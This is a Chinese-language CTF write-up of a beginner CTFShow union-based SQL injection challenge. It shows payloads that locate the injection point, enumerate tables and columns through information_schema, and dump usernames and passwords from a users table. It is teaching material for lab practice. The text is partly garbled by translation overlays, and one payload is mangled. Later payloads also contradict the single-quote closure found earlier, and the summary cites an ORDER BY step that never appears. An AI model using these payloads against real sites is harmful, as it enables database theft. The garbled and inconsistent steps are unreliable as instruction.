📌 题目信息
题目名称：联合查询注入

题目平台：CTFShow

题目类型：Web / SQL注入

难度：极低（适合纯新手入门）

Flag 格式：CTF{xxxxxx}

🎯 题目描述
通过 id 参数尝试进行 SQL 注入，利用联合查询 (Union Select) 获取数据库中的敏感信息（Flag）。

🔍 解题过程 (Write-up)
1. 发现注入点
访问题目页面，发现 URL 中带有参数，例如：?id=1。
测试注入点是否存在：

正常请求：?id=1 —— 页面正常显示。

报错测试：?id=1' —— 页面出现异常或空白，证明存在单引号闭合的 SQL 注入漏洞。

2. 判断列数 (字段数量)
在 UNION 注入中，必须保证前后查询的列数相同。通过不断尝试，发现当前表有 3 个字段：

Payload：   有效载荷:

text   文本
?id=-1' union select 1,2,3 --+？Id =-1' union select 1,2,3——
(注：-1 是为了让前面的正常查询查不到数据，从而使后面的 union 结果直接回显在页面上。)

结果：页面恢复到正常显示模板，并且在特定位置出现了数字 2（说明数据可以回显在第 2 列）。

3. 爆出数据库所有表名
利用 information_schema.tables 查询当前数据库下的所有表名，发现 pages 和 users 两个表。

Payload：   有效载荷:

text   文本
?id=-1%20union%20select%201,2,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database();
(注：group_concat() 用于将多行结果合并为一行显示，database() 指向当前使用的库名。)

返回结果：pages,users。

pages：网页上显示的页面列表。

users：关键的数据库表，Flag 和账号密码大概率在此。

4. 爆出 users 表的列名
得到 users 表后，进一步查询该表的字段结构。

Payload：   有效载荷:

text   文本
?id=-1%20union%20select%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27users%27%20and%20table_schema=database();
返回结果：id,username,password。

确认了 users 表拥有 id、username（用户名）、password（密码/Flag）三列。

5. 获取最终 Flag
利用直接读取字段的方式，拼接出 id-username-password 的数据内容。

Payload：

text
?id=-1%20union%20select%201,2,group_concat(id,%27-%27,username,%27-%27,password)%20from%20users;
最终 Flag 获取：
CTF{admin_secret_password} (示例，实际以题目回显为准)

💡 关键知识点总结 (Lessons Learned)
联合查询条件：使用 union select 时，前后查询的列数必须相等，否则数据库会直接报错或返回空结果。

报错回显：利用 id=-1 构造不存在的 ID，可以有效清空前面的查询结果，让后面的注入语句直接显示在网页上。

information_schema 库：这是 MySQL 元数据存储库，依靠 tables 表和 columns 表，可以像侦探一样层层剥茧，找出目标表和目标字段。

盲测注意：在遇到注入无回显、或者像我之前一样因为某步 Payload 写错导致页面一片空白时，不要气馁，只需重新检查列数是否准确即可。

🐛 避坑记录 / 踩坑总结
空格和注释符问题：URL 传输中，空格最好用 %20 替代，否则浏览器可能会将空格截断；注释符 # 在 URL 中有时会被浏览器识别为锚点，建议替换为 %23 使用。

白板现象：输入 Payload 后如果页面没有任何文字只剩下 CSS 框架，通常是因为列数猜错了（比我之前猜的 3 其实更少或更多），或者表名/库名拼写错误。

本地靶场转在线靶场：本地写的 localhost 当真正注入线上环境时，只需保留 ?id=... 之后的完整 Payload 即可。

🧰 推荐工具
Burp Suite：拦截并重放请求包（就像题目描述里的第一步）。

HackBar：浏览器插件，方便快速 URL 编码 Payload，避免手动输入 %20 和 %23 的繁琐。

💬 结语
这道题非常适合作为 SQL 注入 的入门第一课。它没有 WAF 拦截，没有过滤空格和关键字，只要掌握了 ORDER BY 猜列数和 UNION SELECT 查数据的基本逻辑，就能轻松拿到 Flag。
